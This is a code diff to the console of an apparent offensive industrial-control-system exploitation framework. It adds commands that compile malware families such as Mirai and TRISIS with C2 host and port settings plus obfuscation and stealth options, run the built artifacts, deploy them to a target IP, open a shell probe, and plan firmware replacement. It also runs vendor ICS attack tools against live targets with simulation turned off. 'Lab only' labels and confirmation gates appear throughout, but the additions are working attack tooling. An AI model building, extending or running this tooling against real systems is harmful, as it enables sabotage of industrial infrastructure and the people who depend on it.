@@ -36,7 +36,7 @@ from industrialxpl.core.exploit.utils import (
     module_required, MODULES_DIR,
 )
 
-VERSION = "1.0.44"
+VERSION = "1.0.46"
 
 _BANNER = r"""
  ___           _           _        _       ___  ______  _          _____
@@ -131,11 +131,17 @@ CVE / MITRE / TTP:
 MALWARE RESEARCH (lab only):
   malware list                  Incorporated families (Mirai, TRISIS, Akaja, ...)
   malware analyze <slug>        Vendor source deep-dive + attack vectors
+  malware build <target>        Compile with setg LHOST/LPORT (C2 lab profile)
   malware compile list          Native + vendor compile targets
   malware compile <target>      Build to .tmp/malware_builds/
-  use assessment/malware/malware_native_compiler
-  use scanners/malware_research/mirai_telnet_ics_scanner
-  use cve/malware/triton_tristation_native
+  malware exec <artifact>       Execute built artifact (destructive gate)
+  malware deploy <artifact> <ip>  Deploy to lab target
+  malware shell <ip>            One-shot lab shell/session probe
+  malware firmware <image> <ip> Firmware replace plan / gated flash
+  ics_tools list                Incorporated ICS tools (SCADAPASS, Redpoint, ...)
+  ics_tools run <slug>          Run vendor entry (simulate default)
+  use scanners/malware_research/malware_full_pipeline
+  use scanners/ics_tools_research/ics_tools_ops
 
 RESOURCE FILE MODE (like Metasploit -r):
   ixf -r scan.rc                Run resource file, then drop into interactive shell
@@ -2107,7 +2113,11 @@ Example:
         parts = args.strip().split()
         sub = (parts[0].lower() if parts else "help")
 
-        from industrialxpl.core.malware import MalwareCatalog, MalwareOrchestrator, MalwareCompiler
+        from industrialxpl.core.malware import MalwareCatalog, MalwareOrchestrator, MalwareCompiler, BuildProfile
+        from industrialxpl.core.malware.lab_ops import (
+            execute_artifact, deploy_to_target, firmware_replace_plan, interactive_shell_session,
+        )
+        from pathlib import Path
 
         if sub in ("help", "?", ""):
             print_info("""
@@ -2116,16 +2126,19 @@ Malware commands (lab / authorized research):
   malware list              List incorporated malware families
   malware analyze <slug>    Deep-dive vendor source + attack vectors
   malware plan <slug>       Build orchestration plan for family
+  malware build <target>    Compile with setg LHOST / LPORT (C2 lab profile)
   malware compile list      List compile targets (IXF native + vendor)
   malware compile <target>  Compile artifact to .tmp/malware_builds/
-  malware compile all       Compile all available targets
+  malware exec <path>       Execute built artifact (destructive gate)
+  malware deploy <path> <ip> [port]  Deploy to lab target
+  malware shell <ip> [port] One-shot shell/session probe
+  malware firmware <img> <ip>  Firmware replace (gated)
 
-Examples:
-  malware list
-  malware analyze mirai-iot-botnet
-  malware compile mirai_bot_debug
-  use assessment/malware/malware_native_compiler
-  use scanners/malware_research/mirai_telnet_ics_scanner
+Globals: setg LHOST <ip>  setg LPORT <port>  setg OBFUSCATE true  setg STEALTH true
+
+Modules:
+  use scanners/malware_research/malware_full_pipeline
+  use scanners/ics_tools_research/ics_tools_ops
 """)
             return
 
@@ -2164,6 +2177,57 @@ Examples:
             )
             return
 
+        if sub == "build" and len(parts) >= 2:
+            profile = BuildProfile(
+                lhost=str(self.global_variables.get("LHOST", "")),
+                lport=int(self.global_variables.get("LPORT", 0) or 0),
+                obfuscate=str(self.global_variables.get("OBFUSCATE", "")).lower() in ("1", "true", "yes"),
+                stealth=str(self.global_variables.get("STEALTH", "")).lower() in ("1", "true", "yes"),
+            )
+            r = MalwareCompiler().compile(parts[1], profile=profile if profile.effective_cnc_host() else None)
+            if r.get("success"):
+                print_success("Built: {} (C2 {}:{})".format(
+                    r.get("output"), r.get("c2_host", "—"), r.get("c2_port", "—")))
+            else:
+                print_error(r.get("error", "build failed"))
+            return
+
+        if sub == "exec" and len(parts) >= 2:
+            if not DestructiveGate.require_confirmation(
+                "malware exec", parts[1], "CATASTROPHIC", "Execute malware artifact in lab"
+            ):
+                return
+            r = execute_artifact(Path(parts[1]))
+            print_info(r.get("stdout", "")[:500])
+            print_success("done") if r.get("success") else print_error(r.get("error", "failed"))
+            return
+
+        if sub == "deploy" and len(parts) >= 3:
+            port = int(parts[3]) if len(parts) >= 4 else 23
+            if not DestructiveGate.require_confirmation(
+                "malware deploy", parts[2], "CRITICAL", "Deploy {} to {}".format(parts[1], parts[2])
+            ):
+                return
+            r = deploy_to_target(Path(parts[1]), parts[2], port=port)
+            print_success(str(r)) if r.get("success") else print_error(r.get("error", "failed"))
+            return
+
+        if sub == "shell" and len(parts) >= 2:
+            port = int(parts[2]) if len(parts) >= 3 else 23
+            r = interactive_shell_session(parts[1], port=port, command="id")
+            print_info(r.get("stdout") or r.get("banner") or r.get("response", ""))
+            return
+
+        if sub == "firmware" and len(parts) >= 3:
+            if not DestructiveGate.require_confirmation(
+                "malware firmware", parts[2], "CATASTROPHIC", "Firmware replace with {}".format(parts[1])
+            ):
+                return
+            plan = firmware_replace_plan(parts[2], Path(parts[1]))
+            for step in plan.get("steps", []):
+                print_info("  - {}".format(step))
+            return
+
         if sub == "compile":
             compiler = MalwareCompiler()
             compiler.refresh()
@@ -2193,6 +2257,84 @@ Examples:
 
         print_error("Unknown subcommand: {}".format(sub))
         self.command_malware("help")
+
+    def command_ics_tools(self, args: str, **kwargs) -> None:
+        """ICS-tools vendor analyze, run, compile."""
+        parts = args.strip().split()
+        sub = (parts[0].lower() if parts else "help")
+
+        from industrialxpl.core.ics_tools import IcsToolsOrchestrator, IcsToolsCatalog
+
+        if sub in ("help", "?", ""):
+            print_info("""
+ICS-tools commands (incorporated vendor integration):
+
+  ics_tools list                 List tools (SCADAPASS, Redpoint, SIXNET, ISF, ...)
+  ics_tools analyze <slug>       Vendor inventory + entry script
+  ics_tools plan <slug>          Orchestration plan
+  ics_tools run <slug> [args...] Run vendor entry (add setg TARGET for NSE/sixnet)
+  ics_tools compile <slug>       Compile native/.sln where applicable
+
+  use scanners/ics_tools_research/ics_tools_ops
+
+Examples:
+  ics_tools list
+  ics_tools analyze scadapass
+  setg TARGET 192.168.1.10
+  ics_tools run redpoint
+""")
+            return
+
+        orch = IcsToolsOrchestrator()
+
+        if sub == "list":
+            rows = [(s, IcsToolsCatalog().get(s).label) for s in orch.list_tools()]
+            print_table(["Slug", "Label"], rows, title="ICS-Tools")
+            return
+
+        if sub == "analyze" and len(parts) >= 2:
+            info = orch.analyze(parts[1])
+            if info.get("error"):
+                print_error(info["error"])
+                return
+            print_success("{} [{}] entry={}".format(info["label"], info["interpreter"], info["entry"]))
+            print_info("Path: {}".format(info["vendor_path"]))
+            return
+
+        if sub == "plan" and len(parts) >= 2:
+            plan = orch.build_plan(parts[1], target=str(self.global_variables.get("TARGET", "")))
+            if plan.get("error"):
+                print_error(plan["error"])
+                return
+            print_table(
+                ["Phase", "Action", "Detail"],
+                [(s["phase"], s["action"], s["detail"][:55]) for s in plan.get("plan_steps", [])],
+                title="Plan",
+            )
+            return
+
+        if sub == "run" and len(parts) >= 2:
+            slug = parts[1]
+            extra = parts[2:]
+            target = str(self.global_variables.get("TARGET", ""))
+            if slug == "redpoint" and target:
+                extra = ["-p", "47808", "--script", "BACnet-discover-enumerate", target]
+            r = orch.run(slug, args=extra, simulate=False)
+            if r.get("stdout"):
+                print_info(r["stdout"][:2000])
+            if r.get("success"):
+                print_success("run ok")
+            else:
+                print_error(r.get("error", r.get("stderr", "")[:200]))
+            return
+
+        if sub == "compile" and len(parts) >= 2:
+            r = orch.runner.compile_vendor(parts[1], simulate=False)
+            print_success(str(r)) if r.get("success") else print_error(r.get("error", "failed"))
+            return
+
+        print_error("Unknown: {}".format(sub))
+        self.command_ics_tools("help")
 
     def command_assess(self, args: str, **kwargs) -> None:
         module_path = args.strip()
